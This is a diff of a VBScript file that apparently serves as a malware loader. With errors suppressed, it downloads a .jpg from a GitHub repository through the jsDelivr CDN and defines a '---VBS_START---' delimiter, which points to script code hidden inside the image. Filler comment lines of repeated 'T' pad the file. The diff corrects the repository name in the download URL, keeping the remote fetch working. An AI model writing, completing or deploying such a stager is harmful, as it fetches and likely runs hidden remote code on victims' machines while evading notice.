@@ -7,7 +7,7 @@ On Error Resume Next
 Dim http, stream, b, i, j, match, delimiter
 delimiter = "---VBS_START---"
 Set http = CreateObject("MSXML2.ServerXMLHTTP")
-http.Open "GET", "https://cdn.jsdelivr.net/gh/ocalbackgox/assets@main/manisgod.jpg", False
+http.Open "GET", "https://cdn.jsdelivr.net/gh/localbackgox/assets@main/manisgod.jpg", False
 http.Send
 ' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
 ' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
